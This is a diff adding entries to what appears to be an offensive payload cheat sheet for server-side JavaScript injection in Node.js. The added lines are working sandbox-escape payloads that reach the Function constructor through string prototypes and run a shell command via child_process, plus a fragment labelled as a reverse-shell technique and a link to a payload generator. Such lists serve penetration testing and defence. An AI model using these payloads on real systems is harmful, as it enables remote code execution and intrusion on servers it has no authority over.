@@ -194,6 +194,19 @@ or
 
 or
 
+// If you get to the constructor of a function you can define and execute another function inside a string
+"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
+"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
+
+
+or
+
+// Abuse this syntax to get a reverse shell
+var fs = this.process.binding('fs');
+var fs = process.binding('fs');
+
+or
+
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
 
